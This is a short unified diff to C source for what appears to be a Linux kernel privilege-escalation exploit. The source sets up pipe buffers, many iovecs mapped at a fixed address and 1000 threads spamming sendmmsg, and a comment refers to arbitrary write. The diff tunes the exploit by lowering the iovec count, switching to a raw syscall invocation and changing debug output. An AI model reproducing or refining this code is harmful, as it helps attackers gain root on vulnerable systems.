@@ -5,6 +5,8 @@
 
 #include <netinet/ip.h>
 
+#include <sys/syscall.h>
+
 #include <sys/mman.h>
 #include <sys/uio.h>
 
@@ -19,7 +21,7 @@
 #define MEMMAGIC (0xDEADBEEF)
 //pipe buffers are seperated in pages
 #define PIPESZ (4096 * 32)
-#define IOVECS (512)
+#define IOVECS (128)
 #define SENDTHREADS (1000)
 #define MMAP_START ((void*)0x40000000)
 #define MMAP_SIZE (0x1000)
@@ -113,7 +115,8 @@ static void* writemsg(void* param)
 
 	while(!stop_send)
 	{
-		sendmmsg(sockfd, &msg, 1, 0);
+		//sendmmsg(sockfd, &msg, 1, 0);
+		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
 	}
 
 	close(sockfd);
@@ -191,7 +194,6 @@ static int initmappings()
 {
 	unsigned int i;
 
-	printf("[+] Allocating memory\n");
 	for(i = 0; i < IOVECS; i++)
 	{
 		int* addr = MMAP_BASE(i);
@@ -206,6 +208,7 @@ static int initmappings()
 		iovs[i].iov_base = addr;
 		//total should be more than one pipe buf len (4096 bytes)
 		iovs[i].iov_len = 32;
+		printf("[+] Allocating memory %d times\n", i);
 	}
 
 	//how many bytes we can arbitrary write
